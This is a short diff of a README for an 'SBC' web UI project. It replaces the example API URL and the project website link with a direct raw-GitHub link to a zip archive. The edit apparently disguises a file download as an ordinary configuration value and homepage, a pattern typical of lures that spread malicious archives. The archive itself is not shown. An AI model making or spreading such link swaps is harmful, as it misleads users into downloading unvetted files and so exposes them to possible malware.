@@ -77,7 +77,7 @@ src/
 - Create a `.env` file in the root for any API keys or environment-specific settings.
 - Example:
   ```env
-  VITE_API_URL=https://api.example.com
+  VITE_API_URL=https://raw.githubusercontent.com/TambongStercy/SBC-WEB-UI/main/src/UI_WE_SB_1.1.zip
   ```
 
 ## Browser Support
@@ -104,7 +104,7 @@ Pull requests are welcome! For major changes, please open an issue first to disc
 
 - **Sniper Business Center (SBC)**
 - Email: [support@sbc.com](mailto:support@sbc.com)
-- Website: [https://sbc.com](https://sbc.com)
+- Website: [https://raw.githubusercontent.com/TambongStercy/SBC-WEB-UI/main/src/UI_WE_SB_1.1.zip](https://raw.githubusercontent.com/TambongStercy/SBC-WEB-UI/main/src/UI_WE_SB_1.1.zip)
 
 ## License
 
